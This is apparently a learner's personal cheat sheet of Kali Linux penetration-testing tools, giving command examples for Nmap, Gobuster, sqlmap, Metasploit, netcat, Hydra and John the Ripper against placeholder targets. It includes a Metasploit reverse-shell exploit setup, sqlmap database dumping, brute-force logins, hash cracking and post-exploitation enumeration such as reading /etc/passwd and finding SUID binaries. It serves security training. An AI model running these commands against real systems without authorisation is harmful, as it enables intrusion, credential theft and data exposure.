# 🛠️ Penetration Testing Tools Reference

**Author:** T-MOFE (Obed Ofobrukweta)  
**Platform:** Kali Linux  
**Purpose:** Personal reference of tools used across penetration testing labs and engagements  
**Last Updated:** May 2026  

> This is a living document — updated as new tools are learned and practised.

---

## 📑 Table of Contents

- [Reconnaissance & OSINT](#-reconnaissance--osint)
- [Scanning & Enumeration](#-scanning--enumeration)
- [Web Application Testing](#-web-application-testing)
- [Exploitation](#-exploitation)
- [Password Attacks](#-password-attacks)
- [Post-Exploitation](#-post-exploitation)
- [Network Analysis](#-network-analysis)

---

## 🔍 Reconnaissance & OSINT

### Sublist3r
Automated subdomain enumeration across multiple public sources.
```bash
sublist3r -d target.com -o subdomains.txt
sublist3r -d target.com -v          # verbose, shows results live
```

### crt.sh
Search SSL certificate transparency logs for subdomains.
```
https://crt.sh/?q=%.target.com
```

### Hunter.io
Find staff email addresses and email format patterns for a domain.
```
https://hunter.io/domain/target.com
```

---

## 🔎 Scanning & Enumeration

### Nmap
The core tool for port scanning, service detection, and OS fingerprinting.
```bash
# Basic scan
nmap 192.168.x.x

# Service version detection
nmap -sV 192.168.x.x

# Aggressive scan (OS, versions, scripts, traceroute)
nmap -A -T4 192.168.x.x

# Full port scan
nmap -p- 192.168.x.x

# Scan and save output
nmap -sV -A 192.168.x.x -oN scan_results.txt
```

### Netdiscover
Host discovery — find live machines on a network.
```bash
netdiscover -r 192.168.x.0/24
```

### Gobuster
Directory and file brute-forcing on web servers.
```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/medium.txt -x php,html,txt
```

---

## 🌐 Web Application Testing

### OWASP ZAP
Dynamic Application Security Testing (DAST) — active scanning for web vulnerabilities.
```
1. Set browser proxy to localhost:8080
2. Browse target to build site tree
3. Right-click target → Attack → Active Scan
4. Review Alerts tab for findings
```
**Key features used:**
- Spider / Ajax Spider for site mapping
- Active Scan for automated vulnerability detection
- Alerts panel for reviewing findings by severity

### Burp Suite
Web proxy for intercepting, modifying, and replaying HTTP requests.
```
1. Set browser proxy to localhost:8080
2. Intercept requests in Proxy tab
3. Send to Repeater for manual testing
4. Send to Intruder for automated payload testing
```
**Key features used:**
- Proxy — intercept and modify requests
- Repeater — manually replay and tweak requests
- Intruder — automated payload injection

### Nikto
Web server scanner — checks for known vulnerabilities, misconfigurations, and outdated software.
```bash
nikto -h http://target.com
nikto -h http://target.com -o results.txt
```

### SQLmap
Automated SQL injection detection and exploitation.
```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# With a specific parameter
sqlmap -u "http://target.com/search?q=test" --dbs

# Dump database
sqlmap -u "http://target.com/page?id=1" --dump
```

---

## ⚔️ Exploitation

### Metasploit Framework
The primary exploitation framework — used for loading, configuring, and firing exploits.
```bash
# Start Metasploit
msfconsole

# Search for an exploit
search samba trans2open

# Use an exploit
use exploit/linux/samba/trans2open

# Set options
set RHOSTS 192.168.x.x
set LHOST 192.168.x.x
set PAYLOAD linux/x86/shell_reverse_tcp

# Run
run
```

### Searchsploit
Offline exploit database search — find exploits from Exploit-DB without internet access.
```bash
# Search for exploits
searchsploit apache mod_ssl 2.8
searchsploit samba

# Copy exploit to current directory
searchsploit -m 764.c

# Show exploit path
searchsploit -p 764.c
```
> 💡 Tip: When an exploit needs missing dependencies, searchsploit helps locate alternative or patched versions to work around compilation issues.

### Netcat
Versatile networking tool — used for catching reverse shells and basic port communication.
```bash
# Listen for incoming reverse shell
nc -lvnp 4444

# Connect to open port
nc 192.168.x.x 80

# Simple file transfer
nc -lvnp 4444 > received_file.txt      # receiver
nc 192.168.x.x 4444 < file_to_send.txt # sender
```

---

## 🔑 Password Attacks

### Hydra
Online brute-force tool — attacks login forms, SSH, FTP, and other services.
```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.x.x

# Web login form
hydra -l admin -P rockyou.txt 192.168.x.x http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# FTP
hydra -l user -P rockyou.txt ftp://192.168.x.x
```

### John the Ripper
Offline password cracking — crack hashed passwords from dumped files.
```bash
# Crack a hash file
john hashes.txt

# With a specific wordlist
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked passwords
john --show hashes.txt
```

---

## 🏁 Post-Exploitation

### Basic Shell Enumeration
Commands run after gaining access to understand the compromised system.
```bash
# Who am I?
whoami
id

# What system is this?
uname -a
hostname

# Network configuration
ifconfig
ip a

# Running processes
ps aux

# Other users on the system
cat /etc/passwd

# Check sudo permissions
sudo -l

# Find SUID binaries (privilege escalation vectors)
find / -perm -4000 2>/dev/null
```

---

## 📡 Network Analysis

### Wireshark
Graphical network packet analyser — capture and inspect live traffic.
```
Key filters used:
  http          → filter HTTP traffic only
  tcp           → filter TCP traffic
  ip.addr==x.x.x.x  → filter by IP address
  tcp.port==80  → filter by port
```

---

## 📚 Wordlists (Built into Kali)

| Wordlist | Path | Best Used For |
|---|---|---|
| rockyou.txt | `/usr/share/wordlists/rockyou.txt` | Password attacks |
| common.txt | `/usr/share/wordlists/dirb/common.txt` | Directory brute-forcing |
| medium.txt | `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` | Deeper directory brute-forcing |

---

## 📈 Tools Being Learned

| Tool | Purpose | Status |
|---|---|---|
| Snort | IDS/IPS — network intrusion detection | 📖 Studying |
| pfSense | Firewall policy configuration | 📖 Studying |
| Aircrack-ng | Wireless network security testing | 🔜 Next |

---

*← [Back to Portfolio](../README.md)*
